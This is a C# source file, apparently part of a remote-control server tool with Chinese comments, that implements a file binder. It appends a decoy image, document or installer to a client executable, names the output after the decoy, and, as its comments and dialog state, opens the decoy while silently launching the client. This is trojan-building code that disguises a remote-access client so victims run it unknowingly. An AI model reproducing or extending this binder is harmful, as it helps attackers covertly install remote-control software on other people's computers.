using System;
using System.IO;
using System.Windows.Forms;

namespace RemoteControl.Server
{
    /// <summary>
    /// 文件捆绑器: 将客户端exe与指定文件(图片/文档/安装包)合并为单个exe
    /// 运行时先释放并打开附带文件，再静默启动客户端
    /// </summary>
    public static class FileBundler
    {
        // 分隔标记（16字节随机魔数）
        private static readonly byte[] MAGIC = new byte[] {
            0x7F, 0x42, 0x4E, 0x44, 0x9A, 0xC3, 0xE8, 0x01,
            0xAA, 0x55, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE
        };

        /// <summary>
        /// 创建捆绑文件
        /// </summary>
        /// <param name="clientExePath">客户端exe路径</param>
        /// <param name="attachFilePath">附带文件路径(图片/文档/安装包)</param>
        /// <param name="outputPath">输出路径</param>
        /// <param name="openAttach">运行时是否打开附带文件</param>
        public static bool CreateBundle(string clientExePath, string attachFilePath,
            string outputPath, bool openAttach = true)
        {
            try
            {
                byte[] clientData = File.ReadAllBytes(clientExePath);
                byte[] attachData = File.ReadAllBytes(attachFilePath);
                string attachName = Path.GetFileName(attachFilePath);
                byte[] nameBytes = System.Text.Encoding.UTF8.GetBytes(attachName);

                using (var fs = new FileStream(outputPath, FileMode.Create))
                {
                    // 写入客户端exe
                    fs.Write(clientData, 0, clientData.Length);

                    // 写入MAGIC分隔符
                    fs.Write(MAGIC, 0, MAGIC.Length);

                    // 写入附带文件名长度(4字节) + 文件名
                    byte[] nameLen = BitConverter.GetBytes(nameBytes.Length);
                    fs.Write(nameLen, 0, 4);
                    fs.Write(nameBytes, 0, nameBytes.Length);

                    // 写入选项(1字节): bit0=openAttach
                    fs.WriteByte((byte)(openAttach ? 1 : 0));

                    // 写入附带文件数据长度(4字节) + 数据
                    byte[] dataLen = BitConverter.GetBytes(attachData.Length);
                    fs.Write(dataLen, 0, 4);
                    fs.Write(attachData, 0, attachData.Length);
                }
                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show("捆绑失败: " + ex.Message, "错误",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// 显示捆绑对话框
        /// </summary>
        public static void ShowBundleDialog(string defaultClientExe)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "选择要捆绑的文件（图片/文档/安装包）";
                ofd.Filter = "所有文件|*.*|图片|*.jpg;*.png;*.bmp;*.gif|文档|*.pdf;*.doc;*.docx|安装包|*.exe;*.msi";

                if (ofd.ShowDialog() != DialogResult.OK)
                    return;

                string attachFile = ofd.FileName;
                string attachName = Path.GetFileNameWithoutExtension(attachFile);

                using (var sfd = new SaveFileDialog())
                {
                    sfd.Title = "保存捆绑后的文件";
                    sfd.FileName = attachName + ".exe";
                    sfd.Filter = "可执行文件|*.exe";

                    if (sfd.ShowDialog() != DialogResult.OK)
                        return;

                    if (CreateBundle(defaultClientExe, attachFile, sfd.FileName, true))
                    {
                        MessageBox.Show(
                            "捆绑成功!\n\n输出: " + sfd.FileName +
                            "\n大小: " + (new FileInfo(sfd.FileName).Length / 1024) + " KB" +
                            "\n\n双击运行时会先打开 [" + Path.GetFileName(attachFile) + "]，同时静默启动客户端。",
                            "捆绑完成", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
        }
    }
}
